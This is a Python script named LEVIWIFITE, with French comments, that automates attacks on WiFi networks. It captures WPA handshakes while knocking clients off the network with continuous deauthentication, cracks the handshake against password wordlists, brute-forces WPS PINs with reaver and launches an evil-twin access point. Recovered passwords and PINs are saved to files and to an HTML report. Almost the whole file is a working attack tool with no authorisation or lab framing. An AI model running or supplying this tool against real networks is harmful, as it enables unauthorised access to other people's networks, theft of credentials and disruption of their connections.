#!/usr/bin/env python3
"""
LEVIWIFITE - Moteur d'Attaque Python Avancé
Coordination avec Ruby et Bash
"""

import os
import sys
import json
import time
import subprocess
import argparse
import threading
from datetime import datetime
import signal

class AttackEngine:
    def __init__(self, interface, target_bssid, target_essid, channel, output_dir):
        self.interface = interface
        self.target_bssid = target_bssid
        self.target_essid = target_essid
        self.channel = channel
        self.output_dir = output_dir
        self.attack_processes = []
        self.results = []
        
    def log(self, message, level="INFO"):
        """Log avec timestamp"""
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        print(f"[{timestamp}] [{level}] {message}")
        
    def run_command(self, command, timeout=30, capture_output=True):
        """Exécute une commande avec timeout"""
        self.log(f"Exécution: {command}")
        
        try:
            if capture_output:
                result = subprocess.run(command, shell=True, capture_output=True, 
                                     text=True, timeout=timeout)
                return {
                    'success': result.returncode == 0,
                    'stdout': result.stdout,
                    'stderr': result.stderr,
                    'returncode': result.returncode
                }
            else:
                process = subprocess.Popen(command, shell=True)
                self.attack_processes.append(process)
                return {'success': True, 'process': process}
        except subprocess.TimeoutExpired:
            self.log(f"Timeout pour la commande: {command}", "WARNING")
            return {'success': False, 'error': 'Timeout'}
        except Exception as e:
            self.log(f"Erreur lors de l'exécution: {e}", "ERROR")
            return {'success': False, 'error': str(e)}
    
    def start_monitor_mode(self):
        """Active le mode monitor"""
        self.log("Activation du mode monitor...")
        
        result = self.run_command(f"airmon-ng start {self.interface}")
        if result['success']:
            self.log("Mode monitor activé avec succès")
            return True
        else:
            self.log("Échec de l'activation du mode monitor", "ERROR")
            return False
    
    def set_channel(self):
        """Change le canal de l'interface"""
        self.log(f"Changement vers le canal {self.channel}")
        
        result = self.run_command(f"iw dev {self.interface} set channel {self.channel}")
        if result['success']:
            self.log(f"Canal changé vers {self.channel}")
            return True
        else:
            self.log(f"Échec du changement de canal", "WARNING")
            return False
    
    def capture_handshake(self):
        """Capture le handshake WiFi"""
        self.log("Début de la capture du handshake")
        
        # Nom du fichier de capture
        capture_file = os.path.join(self.output_dir, f"handshake_{self.target_bssid.replace(':', '')}.cap")
        
        # Commande de capture
        command = f"airodump-ng -c {self.channel} --bssid {self.target_bssid} -w {capture_file} {self.interface}"
        
        # Lancer la capture en arrière-plan
        result = self.run_command(command, capture_output=False)
        if not result['success']:
            self.log("Échec du lancement de la capture", "ERROR")
            return None
        
        # Attendre un peu pour la capture
        time.sleep(5)
        
        # Lancer l'attaque de déauthentification
        deauth_process = self.launch_deauth_attack()
        
        # Attendre la capture
        self.log("Attente de la capture du handshake...")
        time.sleep(15)
        
        # Arrêter les processus
        self.stop_attack_processes()
        
        # Vérifier si le handshake a été capturé
        if os.path.exists(capture_file) and os.path.getsize(capture_file) > 0:
            self.log(f"Handshake capturé avec succès: {capture_file}")
            return capture_file
        else:
            self.log("Échec de la capture du handshake", "WARNING")
            return None
    
    def launch_deauth_attack(self):
        """Lance l'attaque de déauthentification"""
        self.log("Lancement de l'attaque de déauthentification")
        
        command = f"aireplay-ng --deauth 0 -a {self.target_bssid} {self.interface}"
        result = self.run_command(command, capture_output=False)
        
        if result['success']:
            self.log("Attaque de déauthentification lancée")
            return result['process']
        else:
            self.log("Échec du lancement de l'attaque de déauthentification", "ERROR")
            return None
    
    def crack_handshake(self, handshake_file):
        """Tente de cracker le handshake"""
        self.log("Tentative de crack du handshake")
        
        # Vérifier la présence de la wordlist
        wordlist_path = "/usr/share/wordlists/rockyou.txt"
        if not os.path.exists(wordlist_path):
            self.log(f"Wordlist non trouvée: {wordlist_path}", "WARNING")
            # Essayer d'autres wordlists communes
            alternative_wordlists = [
                "/usr/share/wordlists/fasttrack.txt",
                "/usr/share/wordlists/metasploit/unix_passwords.txt"
            ]
            for alt in alternative_wordlists:
                if os.path.exists(alt):
                    wordlist_path = alt
                    self.log(f"Utilisation de la wordlist alternative: {wordlist_path}")
                    break
            else:
                self.log("Aucune wordlist disponible", "ERROR")
                return False
        
        # Commande de crack
        command = f"aircrack-ng {handshake_file} -w {wordlist_path}"
        
        # Lancer le crack avec un timeout plus long
        result = self.run_command(command, timeout=600)  # 10 minutes
        
        if result['success']:
            if 'KEY FOUND!' in result['stdout']:
                self.log("🎉 Clé WiFi trouvée!", "SUCCESS")
                self.extract_password(result['stdout'])
                return True
            else:
                self.log("Clé non trouvée dans le handshake", "WARNING")
                return False
        else:
            self.log("Échec du crack du handshake", "ERROR")
            return False
    
    def extract_password(self, crack_output):
        """Extrait le mot de passe du résultat du crack"""
        self.log("Extraction du mot de passe")
        
        # Chercher le mot de passe dans la sortie
        import re
        match = re.search(r'KEY FOUND! \[ (.*) \]', crack_output)
        if match:
            password = match.group(1)
            self.log(f"Mot de passe extrait: {password}")
            
            # Sauvegarder le résultat
            result_file = os.path.join(self.output_dir, f"password_{self.target_bssid.replace(':', '')}.txt")
            with open(result_file, 'w') as f:
                f.write(f"ESSID: {self.target_essid}\n")
                f.write(f"BSSID: {self.target_bssid}\n")
                f.write(f"Password: {password}\n")
                f.write(f"Timestamp: {datetime.now().isoformat()}\n")
            
            self.results.append({
                'target': self.target_essid,
                'bssid': self.target_bssid,
                'password': password,
                'timestamp': datetime.now().isoformat(),
                'success': True,
                'attack_type': 'Handshake'
            })
    
    def perform_wps_attack(self):
        """Tente une attaque WPS"""
        self.log("Tentative d'attaque WPS")
        
        # Vérifier si reaver est disponible
        if not self.check_tool_available('reaver'):
            self.log("Reaver non disponible, attaque WPS ignorée", "WARNING")
            return False
        
        command = f"reaver -i {self.interface} -b {self.target_bssid} -vv"
        
        # Lancer l'attaque WPS avec un timeout
        result = self.run_command(command, timeout=180)  # 3 minutes
        
        if result['success']:
            if 'WPS PIN:' in result['stdout']:
                self.log("Attaque WPS réussie!", "SUCCESS")
                self.extract_wps_pin(result['stdout'])
                return True
            else:
                self.log("Attaque WPS échouée", "WARNING")
                return False
        else:
            self.log("Échec de l'attaque WPS", "ERROR")
            return False
    
    def check_tool_available(self, tool_name):
        """Vérifie si un outil est disponible"""
        try:
            subprocess.run([tool_name, '--help'], capture_output=True, timeout=5)
            return True
        except:
            return False
    
    def extract_wps_pin(self, wps_output):
        """Extrait le PIN WPS du résultat"""
        self.log("Extraction du PIN WPS")
        
        import re
        match = re.search(r"WPS PIN: '(\d+)'", wps_output)
        if match:
            pin = match.group(1)
            self.log(f"PIN WPS trouvé: {pin}")
            
            # Sauvegarder le résultat
            result_file = os.path.join(self.output_dir, f"wps_{self.target_bssid.replace(':', '')}.txt")
            with open(result_file, 'w') as f:
                f.write(f"ESSID: {self.target_essid}\n")
                f.write(f"BSSID: {self.target_bssid}\n")
                f.write(f"WPS PIN: {pin}\n")
                f.write(f"Timestamp: {datetime.now().isoformat()}\n")
            
            self.results.append({
                'target': self.target_essid,
                'bssid': self.target_bssid,
                'wps_pin': pin,
                'timestamp': datetime.now().isoformat(),
                'success': True,
                'attack_type': 'WPS'
            })
    
    def perform_evil_twin_attack(self):
        """Tente une attaque Evil Twin"""
        self.log("Tentative d'attaque Evil Twin")
        
        # Vérifier si hostapd est disponible
        if not self.check_tool_available('hostapd'):
            self.log("Hostapd non disponible, attaque Evil Twin ignorée", "WARNING")
            return False
        
        # Créer la configuration hostapd
        config_file = os.path.join(self.output_dir, f"hostapd_{self.target_bssid.replace(':', '')}.conf")
        
        with open(config_file, 'w') as f:
            f.write(f"interface={self.interface}\n")
            f.write("driver=nl80211\n")
            f.write(f"ssid={self.target_essid}\n")
            f.write("hw_mode=g\n")
            f.write(f"channel={self.channel}\n")
            f.write("wmm_enabled=0\n")
            f.write("macaddr_acl=0\n")
            f.write("auth_algs=1\n")
            f.write("ignore_broadcast_ssid=0\n")
            f.write("wpa=2\n")
            f.write("wpa_passphrase=12345678\n")
            f.write("wpa_key_mgmt=WPA-PSK\n")
            f.write("wpa_pairwise=TKIP\n")
            f.write("rsn_pairwise=CCMP\n")
        
        # Lancer hostapd
        command = f"hostapd {config_file}"
        result = self.run_command(command, capture_output=False)
        
        if result['success']:
            self.log("Attaque Evil Twin lancée", "INFO")
            # Laisser tourner un peu
            time.sleep(10)
            self.stop_attack_processes()
            return True
        else:
            self.log("Échec de l'attaque Evil Twin", "ERROR")
            return False
    
    def stop_attack_processes(self):
        """Arrête tous les processus d'attaque"""
        self.log("Arrêt des processus d'attaque")
        
        for process in self.attack_processes:
            try:
                process.terminate()
                process.wait(timeout=5)
            except:
                try:
                    process.kill()
                except:
                    pass
        
        self.attack_processes.clear()
    
    def generate_report(self):
        """Génère un rapport des attaques"""
        self.log("Génération du rapport Python")
        
        html_content = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <title>Rapport Python - LEVIWIFITE</title>
            <style>
                body {{ font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 20px; background: #f5f5f5; }}
                .header {{ background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 20px; border-radius: 10px; text-align: center; }}
                .result {{ background: white; border: 1px solid #ddd; margin: 15px 0; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }}
                .success {{ border-left: 5px solid #28a745; }}
                .failure {{ border-left: 5px solid #dc3545; }}
                .info {{ border-left: 5px solid #17a2b8; }}
                .stats {{ background: white; padding: 20px; border-radius: 8px; margin: 20px 0; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }}
                .code {{ background: #f8f9fa; padding: 15px; border-radius: 5px; font-family: 'Courier New', monospace; border: 1px solid #e9ecef; }}
                .timestamp {{ color: #6c757d; font-size: 0.9em; }}
                .badge {{ display: inline-block; padding: 4px 8px; border-radius: 12px; font-size: 0.8em; font-weight: bold; }}
                .badge-success {{ background: #d4edda; color: #155724; }}
                .badge-failure {{ background: #f8d7da; color: #721c24; }}
            </style>
        </head>
        <body>
            <div class="header">
                <h1>🐍 Moteur d'Attaque Python - LEVIWIFITE</h1>
                <p>Généré le: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
                <p>Interface: {self.interface} | Canal: {self.channel}</p>
            </div>
            
            <div class="stats">
                <h2>📊 Statistiques des Attaques</h2>
                <p><strong>Total des attaques:</strong> {len(self.results)}</p>
                <p><strong>Attaques réussies:</strong> {len([r for r in self.results if r.get('success', False)])}</p>
                <p><strong>Attaques échouées:</strong> {len([r for r in self.results if not r.get('success', False)])}</p>
            </div>
            
            <h2>🎯 Cible</h2>
            <div class="result info">
                <h3>{self.target_essid}</h3>
                <p><strong>BSSID:</strong> <code>{self.target_bssid}</code></p>
                <p><strong>Canal:</strong> {self.channel}</p>
                <p><strong>Interface:</strong> {self.interface}</p>
            </div>
            
            <h2>⚔️ Résultats des Attaques</h2>
        """
        
        if not self.results:
            html_content += '<div class="result"><p>Aucun résultat disponible</p></div>'
        else:
            for result in self.results:
                status_class = "success" if result.get('success', False) else "failure"
                status_badge = "success" if result.get('success', False) else "failure"
                status_text = "✅ Succès" if result.get('success', False) else "❌ Échec"
                
                html_content += f"""
                <div class="result {status_class}">
                    <h3>{result.get('target', 'N/A')}</h3>
                    <p><strong>BSSID:</strong> <code>{result.get('bssid', 'N/A')}</code></p>
                    <p><strong>Timestamp:</strong> <span class="timestamp">{result.get('timestamp', 'N/A')}</span></p>
                    <p><strong>Statut:</strong> <span class="badge badge-{status_badge}">{status_text}</span></p>
                    <p><strong>Type d'attaque:</strong> {result.get('attack_type', 'N/A')}</p>
                """
                
                if result.get('password'):
                    html_content += f"<p><strong>Mot de passe:</strong> <code>{result['password']}</code></p>"
                
                if result.get('wps_pin'):
                    html_content += f"<p><strong>PIN WPS:</strong> <code>{result['wps_pin']}</code></p>"
                
                html_content += '</div>'
        
        html_content += """
            <h2>🔧 Configuration</h2>
            <div class="code">
                <pre>Interface: """ + self.interface + """
Target BSSID: """ + self.target_bssid + """
Target ESSID: """ + self.target_essid + """
Channel: """ + str(self.channel) + """
Output Directory: """ + self.output_dir + """</pre>
            </div>
        </body>
        </html>
        """
        
        report_file = os.path.join(self.output_dir, "rapport_python.html")
        with open(report_file, 'w') as f:
            f.write(html_content)
        
        self.log(f"Rapport Python généré: {report_file}")
        return report_file
    
    def run_attack_sequence(self):
        """Exécute la séquence d'attaque complète"""
        self.log("🚀 Début de la séquence d'attaque Python")
        
        try:
            # 1. Mode monitor
            if not self.start_monitor_mode():
                self.log("Impossible de continuer sans mode monitor", "ERROR")
                return False
            
            # 2. Changement de canal
            self.set_channel()
            
            # 3. Capture du handshake
            handshake_file = self.capture_handshake()
            
            # 4. Tentative de crack du handshake
            if handshake_file:
                crack_success = self.crack_handshake(handshake_file)
                if not crack_success:
                    self.results.append({
                        'target': self.target_essid,
                        'bssid': self.target_bssid,
                        'timestamp': datetime.now().isoformat(),
                        'success': False,
                        'attack_type': 'Handshake'
                    })
            
            # 5. Attaque WPS
            wps_success = self.perform_wps_attack()
            if not wps_success:
                self.results.append({
                    'target': self.target_essid,
                    'bssid': self.target_bssid,
                    'timestamp': datetime.now().isoformat(),
                    'success': False,
                    'attack_type': 'WPS'
                })
            
            # 6. Attaque Evil Twin (optionnelle)
            try:
                evil_twin_success = self.perform_evil_twin_attack()
                if not evil_twin_success:
                    self.results.append({
                        'target': self.target_essid,
                        'bssid': self.target_bssid,
                        'timestamp': datetime.now().isoformat(),
                        'success': False,
                        'attack_type': 'Evil Twin'
                    })
            except Exception as e:
                self.log(f"Attaque Evil Twin ignorée: {e}", "WARNING")
            
            # 7. Génération du rapport
            self.generate_report()
            
            self.log("✅ Séquence d'attaque Python terminée")
            return True
            
        except Exception as e:
            self.log(f"Erreur lors de l'attaque: {e}", "ERROR")
            return False
        finally:
            self.stop_attack_processes()

def main():
    parser = argparse.ArgumentParser(description='LEVIWIFITE - Moteur d\'Attaque Python')
    parser.add_argument('--interface', required=True, help='Interface WiFi')
    parser.add_argument('--target', required=True, help='BSSID de la cible')
    parser.add_argument('--essid', required=True, help='ESSID de la cible')
    parser.add_argument('--channel', required=True, type=int, help='Canal de la cible')
    parser.add_argument('--output', required=True, help='Répertoire de sortie')
    
    args = parser.parse_args()
    
    # Initialisation du moteur d'attaque
    engine = AttackEngine(
        interface=args.interface,
        target_bssid=args.target,
        target_essid=args.essid,
        channel=args.channel,
        output_dir=args.output
    )
    
    # Exécution de la séquence d'attaque
    success = engine.run_attack_sequence()
    
    if success:
        print("✅ Attaque Python terminée avec succès")
        sys.exit(0)
    else:
        print("❌ Attaque Python échouée")
        sys.exit(1)

if __name__ == "__main__":
    main()
